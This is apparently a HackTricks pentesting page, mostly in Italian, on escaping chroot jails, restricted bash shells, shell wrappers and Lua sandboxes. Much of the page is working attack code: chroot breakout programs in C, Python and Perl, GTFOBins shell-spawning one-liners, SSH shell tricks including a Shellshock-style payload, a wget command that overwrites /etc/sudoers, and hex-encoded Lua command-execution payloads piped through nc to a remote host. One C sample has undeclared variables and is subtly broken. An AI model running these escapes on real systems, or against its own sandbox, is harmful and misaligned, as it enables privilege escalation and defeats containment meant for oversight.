# Escaping from Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Cerca in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **se puoi eseguire qualsiasi binary con proprietà "Shell"**

## Chroot Escapes

Da [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Il meccanismo chroot **non è pensato per difendersi** contro manomissioni intenzionali da parte di **utenti** (**root**) **privilegiati**. Sulla maggior parte dei sistemi, i contesti chroot non si impilano correttamente e i programmi chrooted **con privilegi sufficienti possono eseguire un secondo chroot per uscire**.\
Di solito questo significa che per scappare devi essere root dentro il chroot.

> [!TIP]
> Il **tool** [**chw00t**](https://github.com/earthquake/chw00t) è stato creato per abusare dei seguenti escenarios e scappare da `chroot`.

### Root + CWD

> [!WARNING]
> Se sei **root** dentro un chroot puoi **scappare** creando un **altro chroot**. Questo perché 2 chroot non possono coesistere (in Linux), quindi se crei una cartella e poi **crei un nuovo chroot** su quella nuova cartella essendo **tu fuori da essa**, ora sarai **fuori dal nuovo chroot** e quindi sarai nel FS.
>
> Questo accade perché di solito chroot NON sposta la tua working directory in quella indicata, quindi puoi creare un chroot ma essere fuori da esso.

Di solito non troverai il binary `chroot` dentro una chroot jail, ma potresti **compilare, caricare ed eseguire** un binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Questo è simile al caso precedente, ma in questo caso l'**attacker memorizza un file descriptor alla directory corrente** e poi **crea il chroot in una nuova cartella**. Infine, poiché ha **accesso** a quel **FD** **fuori** dal chroot, vi accede e **fugge**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Crea un processo figlio (fork)
> - Crea una UDS in modo che padre e figlio possano comunicare
> - Esegui chroot nel processo figlio in una cartella diversa
> - Nel processo padre, crea una FD di una cartella che è fuori dal nuovo chroot del processo figlio
> - Passa al processo figlio quella FD usando la UDS
> - Il processo figlio fa chdir a quella FD e, poiché è fuori dal suo chroot, uscirà dalla jail

### Root + Mount

> [!WARNING]
>
> - Montare il device root (/) in una directory dentro il chroot
> - Eseguire chroot in quella directory
>
> Questo è possibile in Linux

### Root + /proc

> [!WARNING]
>
> - Monta procfs in una directory dentro il chroot (se non lo è già)
> - Cerca un pid che abbia una entry root/cwd diversa, come: /proc/1/root
> - Esegui chroot in quella entry

### Root(?) + Fork

> [!WARNING]
>
> - Crea un Fork (processo figlio) ed esegui chroot in una cartella diversa più in profondità nel FS e fai CD su di essa
> - Dal processo padre, sposta la cartella in cui si trova il processo figlio in una cartella precedente al chroot dei figli
> - Questo processo figlio si ritroverà fuori dal chroot

### ptrace

> [!WARNING]
>
> - Tempo fa gli utenti potevano fare debug dei propri processi da un processo di se stessi... ma per default non è più possibile
> - Comunque, se è possibile, potresti fare ptrace su un processo ed eseguire una shellcode al suo interno ([vedi questo esempio](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Ottieni informazioni sulla jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifica PATH

Controlla se puoi modificare la variabile d'ambiente PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers e help viewer

Molti ambienti con restrizioni lasciano ancora disponibili **pagers** o **help viewers**. Di solito sono più rapidi da sfruttare rispetto al tentativo di ricostruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Se `git` è disponibile, ricorda che il suo output di help di solito passa attraverso un pager:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

Una volta che sai quali binari sono raggiungibili, testa prima i più ovvi shell spawner:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Se puoi solo **inject arguments** in un comando consentito (invece di eseguirlo liberamente), controlla anche **GTFOArgs**.

### Create script

Verifica se puoi creare un file eseguibile con _/bin/bash_ come contenuto
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Ottenere bash da SSH

Se stai accedendo tramite ssh puoi spesso chiedere al server di eseguire un **programma diverso** invece della restricted login shell:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Se `ssh` è uno dei pochi binari consentiti localmente, ricorda che può essere abusato anche come **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Dichiarare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puoi sovrascrivere, ad esempio, il file sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Alcuni ambienti non ti fanno accedere a un semplice `rbash`, ma a **wrappers** come `git-shell`, `rssh` o `lshell`:

- `git-shell` accetta solo comandi Git lato server più tutto ciò che è presente in `~/git-shell-commands/`. Se quella directory esiste, esegui `help` per enumerare le azioni personalizzate consentite. Se puoi **scriverci**, qualunque eseguibile inserito in quella directory diventa raggiungibile.
- `rssh` / `lshell` in genere consentono solo operazioni `scp`, `sftp`, `rsync` o in stile Git. In questi casi concentrati prima sulle **file write primitives**: carica `authorized_keys`, un file di avvio della shell o uno script helper in una posizione scrivibile e poi riconnettiti con `ssh -t ...`.
- Se il wrapper filtra solo la command line, enumera i binari raggiungibili e poi torna a **GTFOBins / GTFOArgs**.

### Other tricks

Controlla anche:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Potrebbe essere interessante anche la pagina:**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Tricks per uscire dai python jails nella seguente pagina:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

In questa pagina puoi trovare le global functions a cui hai accesso dentro lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval con command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Alcuni trucchi per **chiamare funzioni di una libreria senza usare i punti**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerare le funzioni di una libreria:
```bash
for k,v in pairs(string) do print(k,v) end
```
Nota che ogni volta che esegui il precedente one liner in un **diverso ambiente lua** l'ordine delle funzioni cambia. Pertanto, se devi eseguire una funzione specifica, puoi eseguire un brute force attack caricando diversi ambienti lua e chiamando la prima funzione della le library:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Ottieni interactive lua shell**: Se sei dentro una limited lua shell puoi ottenere una nuova lua shell (e, si spera, unlimited) chiamando:
```bash
debug.debug()
```
## Riferimenti

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
